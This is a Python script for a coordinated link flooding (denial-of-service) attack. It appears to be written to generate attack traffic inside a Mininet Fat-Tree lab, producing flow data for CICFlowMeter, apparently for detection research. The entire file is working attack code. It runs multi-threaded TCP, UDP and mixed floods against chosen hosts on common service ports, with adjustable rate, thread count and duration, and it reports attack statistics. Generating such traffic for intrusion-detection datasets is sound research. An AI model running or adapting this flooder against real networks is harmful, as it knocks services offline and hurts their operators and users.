#!/usr/bin/env python3
"""
Traditional Link Flooding Attack (LFA)
=======================================
Coordinated low-rate flooding through bottleneck links.
Generates high volume of flows for CICFlowMeter (targeting 500K+ flows).

Topology mapping for Fat-Tree k=4:
  - h1-h4:   Pod 0 (10.0.0.x, 10.0.1.x)
  - h5-h8:   Pod 1 (10.1.0.x, 10.1.1.x)
  - h9-h12:  Pod 2 (10.2.0.x, 10.2.1.x)
  - h13-h16: Pod 3 (10.3.0.x, 10.3.1.x)

Usage:
    # From Mininet CLI:
    mininet> h1 python3 attacks/attack_traditional_lfa.py --target-pod 2 --duration 300 --rate 5000 &
    mininet> h2 python3 attacks/attack_traditional_lfa.py --target-pod 2 --duration 300 --rate 5000 &
    mininet> h5 python3 attacks/attack_traditional_lfa.py --target-pod 2 --duration 300 --rate 5000 &
"""

import socket
import random
import time
import argparse
import threading
import struct
from datetime import datetime

# Fat-Tree topology host mapping
TOPOLOGY = {
    0: ['10.0.0.1', '10.0.0.2', '10.0.1.1', '10.0.1.2'],      # h1-h4
    1: ['10.1.0.1', '10.1.0.2', '10.1.1.1', '10.1.1.2'],      # h5-h8
    2: ['10.2.0.1', '10.2.0.2', '10.2.1.1', '10.2.1.2'],      # h9-h12
    3: ['10.3.0.1', '10.3.0.2', '10.3.1.1', '10.3.1.2']       # h13-h16
}

class TraditionalLFABot:
    """Single attack bot generating coordinated LFA traffic"""
    
    def __init__(self, target_ips, rate=5000, protocol='tcp'):
        self.target_ips = target_ips
        self.rate = rate  # flows per second
        self.protocol = protocol.lower()
        self.active = False
        self.stats = {'flows': 0, 'bytes': 0, 'packets': 0}
        
    def generate_tcp_flow(self, target_ip, target_port):
        """Generate single TCP flow"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            # Use random source port for flow diversity
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            try:
                sock.connect((target_ip, target_port))
                # Send small payload to establish flow
                payload = b'A' * random.randint(100, 1500)
                sock.send(payload)
                self.stats['bytes'] += len(payload)
                self.stats['packets'] += 1
                time.sleep(random.uniform(0.01, 0.1))  # Flow duration
            except:
                pass
            finally:
                sock.close()
                self.stats['flows'] += 1
        except:
            pass
    
    def generate_udp_flow(self, target_ip, target_port):
        """Generate single UDP flow"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            # Send burst of UDP packets for single flow
            num_packets = random.randint(5, 50)
            for _ in range(num_packets):
                payload = b'U' * random.randint(100, 1400)
                sock.sendto(payload, (target_ip, target_port))
                self.stats['bytes'] += len(payload)
                self.stats['packets'] += 1
                time.sleep(random.uniform(0.001, 0.01))
            
            sock.close()
            self.stats['flows'] += 1
        except:
            pass
    
    def run_attack(self, duration):
        """Execute attack for specified duration"""
        self.active = True
        start_time = time.time()
        flow_interval = 1.0 / self.rate if self.rate > 0 else 0.001
        
        print(f"[LFA] Starting Traditional LFA - Rate: {self.rate} flows/sec, Duration: {duration}s")
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            target_port = random.choice([80, 443, 8080, 22, 21, 3306, 5432])
            
            if self.protocol == 'tcp':
                self.generate_tcp_flow(target_ip, target_port)
            elif self.protocol == 'udp':
                self.generate_udp_flow(target_ip, target_port)
            else:  # mixed
                if random.random() < 0.7:
                    self.generate_tcp_flow(target_ip, target_port)
                else:
                    self.generate_udp_flow(target_ip, target_port)
            
            time.sleep(flow_interval)
            
            # Progress report every 10 seconds
            if int(time.time() - start_time) % 10 == 0 and self.stats['flows'] > 0:
                elapsed = time.time() - start_time
                print(f"[LFA] {elapsed:.0f}s - Flows: {self.stats['flows']}, "
                      f"Packets: {self.stats['packets']}, "
                      f"Rate: {self.stats['flows']/elapsed:.1f} flows/s")
        
        self.active = False
        total_time = time.time() - start_time
        print(f"\n[LFA] Attack Complete:")
        print(f"  Total flows:   {self.stats['flows']:,}")
        print(f"  Total packets: {self.stats['packets']:,}")
        print(f"  Total bytes:   {self.stats['bytes']:,}")
        print(f"  Duration:      {total_time:.1f}s")
        print(f"  Avg rate:      {self.stats['flows']/total_time:.1f} flows/s")


class MultiSourceLFA:
    """Coordinate multiple attack sources"""
    
    def __init__(self, target_pod, num_threads=8, rate_per_thread=5000, protocol='mixed'):
        self.target_ips = TOPOLOGY[target_pod]
        self.num_threads = num_threads
        self.rate_per_thread = rate_per_thread
        self.protocol = protocol
        self.bots = []
        
    def launch(self, duration):
        """Launch coordinated multi-threaded attack"""
        print(f"\n{'='*70}")
        print(f"  Traditional LFA Attack")
        print(f"{'='*70}")
        print(f"  Targets:     {', '.join(self.target_ips)}")
        print(f"  Threads:     {self.num_threads}")
        print(f"  Rate/thread: {self.rate_per_thread} flows/sec")
        print(f"  Total rate:  {self.num_threads * self.rate_per_thread} flows/sec")
        print(f"  Duration:    {duration}s")
        print(f"  Protocol:    {self.protocol}")
        print(f"  Est. flows:  {self.num_threads * self.rate_per_thread * duration:,}")
        print(f"{'='*70}\n")
        
        threads = []
        for i in range(self.num_threads):
            bot = TraditionalLFABot(self.target_ips, self.rate_per_thread, self.protocol)
            self.bots.append(bot)
            t = threading.Thread(target=bot.run_attack, args=(duration,))
            threads.append(t)
            t.start()
            time.sleep(0.1)  # Stagger thread starts
        
        # Wait for all threads
        for t in threads:
            t.join()
        
        # Aggregate statistics
        total_flows = sum(b.stats['flows'] for b in self.bots)
        total_packets = sum(b.stats['packets'] for b in self.bots)
        total_bytes = sum(b.stats['bytes'] for b in self.bots)
        
        print(f"\n{'='*70}")
        print(f"  FINAL STATISTICS")
        print(f"{'='*70}")
        print(f"  Total flows:   {total_flows:,}")
        print(f"  Total packets: {total_packets:,}")
        print(f"  Total bytes:   {total_bytes:,} ({total_bytes/1e6:.2f} MB)")
        print(f"  Achieved rate: {total_flows/duration:.1f} flows/sec")
        print(f"{'='*70}\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Traditional LFA Attack')
    parser.add_argument('--target-pod', type=int, default=2, choices=[0,1,2,3],
                        help='Target pod number (0-3)')
    parser.add_argument('--duration', type=int, default=300,
                        help='Attack duration in seconds (default: 300)')
    parser.add_argument('--rate', type=int, default=5000,
                        help='Flows per second per thread (default: 5000)')
    parser.add_argument('--threads', type=int, default=8,
                        help='Number of attack threads (default: 8)')
    parser.add_argument('--protocol', choices=['tcp', 'udp', 'mixed'], default='mixed',
                        help='Protocol type (default: mixed)')
    
    args = parser.parse_args()
    
    attack = MultiSourceLFA(
        target_pod=args.target_pod,
        num_threads=args.threads,
        rate_per_thread=args.rate,
        protocol=args.protocol
    )
    
    attack.launch(args.duration)
